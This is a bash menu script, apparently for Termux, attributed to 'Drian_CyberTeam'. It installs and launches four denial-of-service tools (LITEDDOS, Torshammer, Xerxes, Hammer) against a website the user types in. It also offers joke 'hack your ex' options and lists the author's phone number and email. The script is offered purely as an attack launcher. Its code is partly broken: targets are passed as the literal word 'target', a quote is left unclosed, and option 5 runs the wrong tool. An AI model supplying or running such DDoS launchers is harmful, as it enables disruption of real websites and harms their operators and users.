#!/system/xbin/bash
#Author Drian_CyberTeam

clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'    
sleep 1
figlet Drian | lolcat
echo $blue "Name     : Drian/Jingga"
echo $blue "Whatsapp : 082385873880"
echo $blue "Contact  : Andriand07@gmail.com"
echo $blue "Team     : Drian_CyberTeam"
echo
echo $red "=========================================="
echo
echo
echo $cyan"======TOOLS BY DRIAN====="
echo
echo $green"Daftar Toolsnya=>"
echo
echo
echo
echo $purple"[1] DDOS Website Dengan LITEDDOS"
echo
echo $purple"[2] DDOS Website Dengan THORSHAMMER"
echo
echo $purple"[3] DDOS Website Dengan XERXES"
echo
echo $purple"[4] DDOS Website Dengan HAMMER"
echo
echo $red"[5] TOOLS HACK MANTAN"
echo
echo $red"[6] TOOLS HACK PACAR ORANG"
echo
echo $green"[7] TOOLS AGAR GANTENG / CANTIK"
echo
echo $green"[8] TOOLS NGILANGIN GALAU"

echo $blue "===================================="
echo
echo
echo
echo $green
read -p "╭─[Pilih Nomer]
╰─root@Drian=•>" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
echo $green"Installing LITEDDOS..."
sleep 1
apt update
apt install git
git clone 
https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
echo $green"Installing.....
apt update
apt install git
git clone 
https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
read -p "Masukan Target:" target
python2 torshammer.py -T -t target
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
echo $green"Installing Xerxes 
DDOS..."
sleep 1
apt update && apt upgrade
apt install git
apt install clang
git clone 
https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
clang xerxes.c -o xerxes
clear
read -p "[masukanWebsiteTarget]>" 
target
./xerxes target 80
fi

if [ $bro = 4 ] || [ $bro = 5 ]
then
clear
echo $green" Installing Hammer 
DDOS.."
sleep 1
git clone 
https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
read -p "Masukan Target:" target
python2 hammer.py -T -t target
fi
